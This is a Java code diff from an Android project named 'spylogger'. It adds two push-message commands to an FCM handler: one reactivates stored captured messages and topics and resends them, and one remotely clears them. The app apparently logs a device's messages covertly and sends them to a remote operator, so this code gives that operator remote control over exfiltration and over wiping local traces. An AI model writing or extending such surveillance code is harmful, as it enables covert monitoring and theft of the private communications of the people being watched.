@@ -9,8 +9,10 @@ import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
+import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
 import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
@@ -85,10 +87,47 @@ public class FcmHelperService {
             case CONFIGURACAO:
                 atualizarConfiguracao();
                 break;
+            case SOLICITAR_REENVIO:
+                reenviarMensagens();
+                break;
+            case LIMPAR:
+                limparMensagens();
+                break;
             default:
                 return;
         }
     }
+
+    private void limparMensagens() {
+        try {
+            RepositorioTopico repositorioTopico=new RepositorioTopicoImpl(context);
+            RepositorioMensagem repositorioMensagem=new RepositorioMensagemImpl(context);
+
+            repositorioMensagem.limpar();
+            repositorioTopico.limpar();
+
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void reenviarMensagens() {
+        try {
+            RepositorioTopico repositorioTopico=new RepositorioTopicoImpl(context);
+            RepositorioMensagem repositorioMensagem=new RepositorioMensagemImpl(context);
+
+            repositorioTopico.reativar();
+            repositorioMensagem.reativar();
+
+            SendMensagensService sendMensagensService=new SendMensagensService(context,null);
+            sendMensagensService.enviarTopicos();
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        }
+    }
+
 
     private void atualizarConfiguracao(){
         try {
